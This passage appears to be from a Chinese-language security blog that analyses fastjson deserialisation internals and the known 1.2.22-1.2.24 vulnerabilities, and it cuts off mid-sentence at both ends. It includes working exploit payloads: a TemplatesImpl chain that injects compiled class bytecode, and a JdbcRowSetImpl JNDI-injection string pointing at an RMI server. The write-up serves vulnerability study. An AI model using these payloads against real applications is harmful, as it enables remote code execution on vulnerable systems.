class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHobby</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobby</span><span class="params">(String hobby)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, properties=&quot;</span> + properties +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="comment">// fastjson 1.2.24</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 全局配置，不进ASM动态类</span></span><br><span class="line">        SerializeConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Jasper&quot;</span>, <span class="number">22</span>, <span class="string">&quot;fuck some people&quot;</span>);</span><br><span class="line"><span class="comment">//        String s1 = JSON.toJSONString(user);</span></span><br><span class="line"><span class="comment">//        System.out.println(s1);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化后的字符串：&quot;</span>+s2);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用了getName</span><br><span class="line">序列化后的字符串：&#123;&quot;@type&quot;:&quot;Pojo.User&quot;,&quot;age&quot;:22,&quot;hobby&quot;:&quot;fuck some people&quot;,&quot;name&quot;:&quot;Jasper&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="为什么会调getter"><a href="#为什么会调getter" class="headerlink" title="为什么会调getter"></a>为什么会调getter</h2><p>宏观上理解，为了把对象转JSON，需获取对象的属性值。要么调getter取值，要么反射取值，这里用的前者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:450, FieldInfo</span><br><span class="line">getPropertyValueDirect:110, FieldSerializer</span><br><span class="line">write:196, JavaBeanSerializer</span><br><span class="line">write:275, JSONSerializer</span><br><span class="line">toJSONString:559, JSON</span><br><span class="line">toJSONString:548, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698300347029-ae57f17f-9046-4224-9bdb-bac7424c4f31.png" alt="image.png"></p><h2 id="构造JSON字符串的地方"><a href="#构造JSON字符串的地方" class="headerlink" title="构造JSON字符串的地方"></a>构造JSON字符串的地方</h2><p>核心在这个try-catch里，上面的调用getter取值也在这里面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">write:196, JavaBeanSerializer</span><br><span class="line">write:275, JSONSerializer</span><br><span class="line">toJSONString:559, JSON</span><br><span class="line">toJSONString:548, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698300741065-e554dae6-0de1-450a-ac5e-64eda9222170.png" alt="image.png"></p><h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 全局配置，不进ASM动态类</span></span><br><span class="line">        SerializeConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Pojo.User\&quot;,\&quot;age\&quot;:22,\&quot;hobby\&quot;:\&quot;fuck some people\&quot;,\&quot;name\&quot;:\&quot;Jasper\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parse-------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s2);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parseObject-----------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parseObject(s2);</span><br><span class="line">        System.out.println(parse1);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parseObject---------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse2</span> <span class="operator">=</span> JSON.parseObject(s2,Object.class);</span><br><span class="line">        System.out.println(parse2);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse2.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">User&#123;name=&#x27;Jasper&#x27;, age=22, hobby=&#x27;fuck some people&#x27;, properties=null&#125;</span><br><span class="line">反序列化对象所属类：Pojo.User</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">调用了getName</span><br><span class="line">调用了getProperties</span><br><span class="line">&#123;&quot;name&quot;:&quot;Jasper&quot;,&quot;age&quot;:22,&quot;hobby&quot;:&quot;fuck some people&quot;&#125;</span><br><span class="line">反序列化对象所属类：com.alibaba.fastjson.JSONObject</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">User&#123;name=&#x27;Jasper&#x27;, age=22, hobby=&#x27;fuck some people&#x27;, properties=null&#125;</span><br><span class="line">反序列化对象所属类：Pojo.User</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><h2 id="1-根据JSON字符串封装deserializer"><a href="#1-根据JSON字符串封装deserializer" class="headerlink" title="1.根据JSON字符串封装deserializer"></a>1.根据JSON字符串封装deserializer</h2><p>宏观上看，此步骤依据一系列规则，选择出可以参与反序列化的field，存进fieldList，放入deserializer。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">build:132, JavaBeanInfo</span><br><span class="line">&lt;init&gt;:39, JavaBeanDeserializer</span><br><span class="line">createJavaBeanDeserializer:586, ParserConfig</span><br><span class="line">getDeserializer:461, ParserConfig</span><br><span class="line">getDeserializer:312, ParserConfig</span><br><span class="line">parseObject:367, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698390119436-4d5e6377-6486-4a54-87a9-ffaf6d596238.png" alt="image.png"><br>当函数执行到return，获取到所有符合条件的field，里面有它对应的method，这是后面会调用到的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698390350055-073de250-31ec-43c4-9eed-c4adc8364e2c.png" alt="image.png"><br>这里面实际上就有很多分析文章里提到的，getter和setter需要满足的条件。<br>不满足下面这些if判断的method不会add进fieldList，也就不会在下一小节被调用。<br><strong>setter需满足的条件</strong><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698404119899-9ea4ec6b-bbf4-44c8-8fec-16444eb44d0a.png" alt="image.png"><br><strong>getter需满足的条件</strong><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698404743852-cea4a5cc-dab9-43d3-b0aa-ff7f23a7f33c.png" alt="image.png"></p><h2 id="2-调用deserializer-deserialize创建并初始化对象"><a href="#2-调用deserializer-deserialize创建并初始化对象" class="headerlink" title="2.调用deserializer#deserialize创建并初始化对象"></a>2.调用deserializer#deserialize创建并初始化对象</h2><p><strong>核心逻辑就是，创建一个object变量，然后遍历前面获取的fieldList，对于每个field，调用其getter或者setter或者直接调用native set方法去给field赋值，然后返回object。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deserialze:271, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure><p>下面的图，给出了不同的field是如何设置属性值的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698418921724-c390b176-b81c-4402-9b3c-574351c6042d.png" alt="image.png"></p><h2 id="parse和parseObject的区别"><a href="#parse和parseObject的区别" class="headerlink" title="parse和parseObject的区别"></a>parse和parseObject的区别</h2><p>单参parseObject是parse的封装，在封装的末尾，多了一个JSON.toJSON()，转JSONObject类型的操作。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698405744528-716355e9-7545-4a51-889b-f5750dcab5fa.png" alt="image.png"><br>这个操作会调用obj对象的所有getter方法。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698405588482-9209f38e-9327-474e-815d-746f019f82f3.png" alt="image.png"><br>而双参parseObecjt则不会调用JSON.toJSON()，从调用getter&#x2F;setter的角度相当于parse函数。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698408678972-84dfc6c8-4cbe-450f-805c-9a3c8c8808e7.png" alt="image.png"><br><strong>总结：单参parseObject先调用一遍parse能调用的setter和getter，然后再调用一遍object所有的getter；</strong><br><strong>双参parseObject在调getter&#x2F;setter方面相当于parse。</strong></p><h1 id="1-2-22-1-2-24"><a href="#1-2-22-1-2-24" class="headerlink" title="1.2.22-1.2.24"></a>1.2.22-1.2.24</h1><h2 id="TemplatsImpl链"><a href="#TemplatsImpl链" class="headerlink" title="TemplatsImpl链"></a>TemplatsImpl链</h2><p>本质上，就是利用fastjson的任意getter调用去调getOutputProperties，触发CC3后半的链条。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="comment">// fastjson 1.2.22-1.2.24</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> ClassFile2Base64(<span class="string">&quot;D:\\Calc.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;%s\&quot;,\&quot;_bytecodes\&quot;: [\&quot;%s\&quot;],&#x27;_name&#x27;:&#x27;jasper&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,&#x27;_outputProperties&#x27;:&#123;&#125;&#125;&quot;</span>, className,codes);</span><br><span class="line">        JSON.parse(exp, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ClassFile2Base64</span><span class="params">(String filePath)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>要开Feature，挺鸡肋的</li></ul><h3 id="为什么加-type指定全类名"><a href="#为什么加-type指定全类名" class="headerlink" title="为什么加@type指定全类名"></a>为什么加@type指定全类名</h3><p>不加的话，parse函数不会触发getter和setter</p><h3 id="为什么parse要加Feature参数"><a href="#为什么parse要加Feature参数" class="headerlink" title="为什么parse要加Feature参数"></a>为什么parse要加Feature参数</h3><p>Feature.SupportNonPublicField，字面意思要允许给非public字段赋值，CC3这些字段都public的。<br>由此可见这条链其实很鸡肋。</p><h3 id="为什么-bytecodes要base64编码"><a href="#为什么-bytecodes要base64编码" class="headerlink" title="为什么_bytecodes要base64编码"></a>为什么_bytecodes要base64编码</h3><p>Fastjson解析到byte[]数组的时候，会对byte[]数组进行base64decode。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bytesValue:112, JSONScanner</span><br><span class="line">deserialze:136, ObjectArrayCodec</span><br><span class="line">parseArray:723, DefaultJSONParser</span><br><span class="line">deserialze:177, ObjectArrayCodec</span><br><span class="line">parseField:71, DefaultFieldDeserializer</span><br><span class="line">parseField:773, JavaBeanDeserializer</span><br><span class="line">deserialze:600, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:193, JSON</span><br><span class="line">main:13, Test1TemplatesImpl</span><br></pre></td></tr></table></figure><h3 id="为什么会触发getOutputProperties"><a href="#为什么会触发getOutputProperties" class="headerlink" title="为什么会触发getOutputProperties"></a>为什么会触发getOutputProperties</h3><p>前面我们知道parse函数触发getter比setter苛刻，但是getOutputProperties正好满足要求。</p><ul><li>TemplatesImpl里只有对应的getter没有setter，setter不会抢getter位置</li><li>函数名符合规范</li><li>非static</li><li>返回值是Properties，是Map接口的实现类</li><li>无参</li></ul><h2 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h2><p>本质是触发JNDI注入。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot; ,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul><li>因为用的JNDI注入，受JDK版本限制</li><li>要能出网，不然无法加载远程类</li></ul><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>JdbcRowSetImpl#connect有一个标准的JNDI注入<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698422368971-6be86174-3e37-4d35-a58d-e2e5060b0ae0.png" alt="image.png"><br>存在对应setter可以控制注入点<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698423729449-9b5047c8-bcc1-4bc7-90f7-eb385875c1df.png" alt="image.png"><br>find usage看哪调了connect，在JdbcRowSetImpl#setAutoCommit调用了，以这个做为sink点即可。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698423846048-563056cc-bb62-4197-8462-710029dc5506.png" alt="image.png"></p><h3 id="为什么是DataSourceName而不是dataSource"><a href="#为什么是DataSourceName而不是dataSource" class="headerlink" title="为什么是DataSourceName而不是dataSource"></a>为什么是DataSourceName而不是dataSource</h3><p>注意到exp里写的并不是属性名dataSource，而是对应setter去掉set后的字符串DataSourceName。<br>这涉及到fastjson反序列化的属性赋值流程：</p><ol><li>通过setter&#x2F;getter截断前三字符，确定为propertyName</li><li>扫描JSON String，通过propertyName匹配到propertyValue（这是我们控制属性值的地方）</li><li>调用对应setter，setter(propertyValue)</li></ol><p>显然，在第二步扫描JSON String的时候，用的propertyName是函数截断后的字符，而不一定是真的属性名。<br>以上面为例，第二步是按照dataSourceName去JSON String里找对应值，而不是按dataSource去找。</p><h1 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h1><p>引入autoTypeSupport，默认为False，开启黑白名单校验与Bypass之路。</p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>修改fastjson版本到1.2.25，再次运行上面的exp，程序抛出异常。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717429189-80eeaf7e-d424-4e20-b2f1-af9118a4f559.png"><br>注意到异常抛出点：com.alibaba.fastjson.parser.ParserConfig.checkAutoType，下断点调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:805, ParserConfig</span><br><span class="line">parseObject:322, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:6, Test1JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>默认情况下，会进入这个IF，对类名先黑名单校验，再白名单校验。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717639728-09e39775-2594-459c-8063-e9e721548432.png"><br>黑名单里有前两条链子指定的类，所以直接抛异常。<br><img 